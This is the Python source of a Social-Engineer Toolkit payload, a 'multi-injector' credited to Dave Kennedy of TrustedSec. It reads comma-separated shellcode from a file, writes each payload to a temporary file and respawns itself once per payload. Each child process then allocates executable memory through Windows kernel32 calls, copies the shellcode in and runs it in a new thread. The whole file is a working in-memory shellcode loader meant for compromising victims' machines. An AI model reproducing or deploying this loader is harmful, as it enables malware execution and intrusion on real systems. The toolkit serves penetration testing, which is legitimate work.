#
# The Social-Engineer Toolkit (SET) Multi-Injector Payload
#        For when one is just not enough.
#
#   This will add as many payloads as you want to in order
#   to inject purely into memory. Hot stuff.
#   Written by: Dave Kennedy @ TrustedSec
#
#
# IMPORTANT: YOU NEED TO BYTE COMPILE THIS WITH PYINSTALLER 1.5
# OR PYINSTALLER 2.1 + (dev branch at this time). Known bug when
# calling the same executable within pyinstaller.
#
import ctypes
import threading
import sys
import subprocess
import tempfile
from uuid import uuid4
import os

# define our shellcode injection code through ctypes
def inject(shellcode):
    shellcode = shellcode.decode("string_escape")
    shellcode = bytearray(shellcode)
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                   ctypes.c_int(len(shellcode)))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
# this grabs the filename we need for our shellcode
try:
    # this is the whole file that contains all of our
    # shellcode, so for example all 5 would be in this file
    shellcode_filename = sys.argv[1]
    # this is the name of our exe
    executable_filename = sys.argv[2]

except: sys.exit()
    
# if we are exeucuting seperate processes
execute_shellcode = 0
    
# this is where we wrote out files in order to execute each in individual processes
try:
    
    process = sys.argv[3]
    execute_filename = sys.argv[4]
    execute_shellcode = 1
    
except: pass
 
if execute_shellcode == 0:
    # import in the shellcode    
    if os.path.isfile(tempfile.gettempdir() + "\\" + shellcode_filename):
        fileopen = file(tempfile.gettempdir() + "\\" + shellcode_filename, "r")
        shellcode = fileopen.read()
        shellcode = shellcode.split(",")
    if os.path.isfile(shellcode_filename):
        fileopen = file(shellcode_filename, "r")
        shellcode = fileopen.read()
        shellcode = shellcode.split(",")
    
# This is a hack job way of getting this to work, basically what is happening is when
# calling any shellcode works however if the destination does not allow the port the
# entire application will crash. We need to create completely seperate processes in order
# for it not to crash, so we'll spawn multiple instances of the same instance. Sucks but
# works. With with exitfunc thread/process, etc. ctypes hard crashes within python.

filename = tempfile.gettempdir() + "\\" + executable_filename # cannot use based on byte compiled python.stack()[-1][1]
temp = executable_filename # inspect.stack()[-1][1]

random_name = tempfile.gettempdir() + "\\" + str(uuid4())
# grab initial count of how many we have in our array and write out tmp files
counter = 0
if execute_shellcode == 0:
    for payload in shellcode:
        filewrite = file(random_name + str(counter) + ".tmp", "w")
        filewrite.write(payload)
        filewrite.close()
        counter = counter + 1
    counter2 = 0
    for payload in shellcode:
        try:
            if counter2 != counter:
                use_filename = random_name + str(counter2) + ".tmp"
                use_counter = 0
                if os.path.isfile(filename):
                    subprocess.Popen(filename + " 1 1 1 %s" % (use_filename), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    use_counter = 1
                if os.path.isfile(temp):
                    if use_counter == 0:
                        if temp.endswith(".py"):
                            subprocess.Popen("python " + temp + " 1 1 1 %s" % (use_filename), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                        if temp.endswith(".exe"):
                            subprocess.Popen(temp + " 1 1 1 %s" % (use_filename), shell=True)
                counter2 = counter2 + 1
        except: pass

# If we are running in a seperate process through subprocess
# then call the actual shellcode and load it into memory.
if execute_shellcode == 1:
    execute_filename = execute_filename
    fileopen = file(execute_filename, "r")
    shellcode = fileopen.read()
    # create the thread to shoot into memory
    thread = threading.Thread(target=inject, args=(shellcode,))
    # start the thread
    thread.start()
